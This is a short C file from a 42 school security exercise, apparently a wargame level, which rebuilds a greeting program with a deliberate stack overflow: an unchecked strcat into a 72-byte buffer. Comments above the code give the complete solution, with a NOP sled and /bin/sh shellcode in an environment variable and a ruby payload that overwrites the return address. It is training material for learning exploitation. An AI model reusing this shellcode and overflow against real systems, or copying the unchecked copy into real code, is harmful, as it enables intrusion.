/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   bonus2.c                                           :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: fcadet <fcadet@student.42.fr>              +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2021/04/22 16:08:59 by fcadet            #+#    #+#             */
/*   Updated: 2021/04/23 14:41:17 by fcadet           ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#include <string.h>
#include <stdio.h>
#include <stdlib.h>

//return from greetuser @ 72 + 4 = 76 bytes from s
//export LANG=nl
//export EXPLOIT=$(ruby -e 'print "\x90" * 128 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\xb0\x0b\x89\xe3\x31\xc9\x31\xd2\xcd\x80"')
//EXPLOIT ~@ 0xbffff873 -> middle @ 0xbffff86a + 64 = 0xbffff8d7
//ruby -e 'print "x" * 40 + " " + "x" * (32 - (13 - 4)) + "\xd7\xf8\xff\xbf"'

unsigned int	language = 0;

void	greetuser(char *str) {
	char	s[72];

	if (language == 1)
		memcpy(s, "Hyvää päivää ", 19);
	else if (language == 2)
		memcpy(s, "Goedemiddag! ", 14);
	else if (language == 0)
		memcpy(s, "Hello ", 7);
	strcat(s, str);
	puts(s);
}

int		main(int argc, char **argv) {
	char	*env;	
	char	str[76];

	if (argc != 3)
		return (1);
	memset(str, '\0', 76);
	strncpy(str, argv[1], 40);
	strncpy(str + 40, argv[2], 32);
	env = getenv("LANG");
	if (env) {
		if (!memcmp(env, "fi", 2))
			language = 1;
		if (!memcmp(env, "nl", 2))
			language = 2;
	}
	greetuser(str);
	return (0);
}
